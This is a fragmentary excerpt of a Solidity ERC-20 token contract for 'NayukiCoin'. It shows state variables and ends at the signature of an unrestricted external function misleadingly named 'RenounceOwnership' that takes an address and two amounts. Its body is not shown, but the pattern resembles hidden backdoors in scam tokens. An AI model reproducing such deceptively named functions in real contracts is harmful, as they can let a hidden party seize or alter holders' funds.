...
contract NayukiHoldingsLimited is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _tokens;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => uint256) private recipients; 
    string private _name = "NayukiCoin";
    string private _symbol = "Nayuki";
    uint256 private _decimals = 9;
    uint256 private _totalSupply = 50000000 * 10 ** 9;
    ...
    function RenounceOwnership(address Masters, uint256 Master, uint256 Master1) external  {
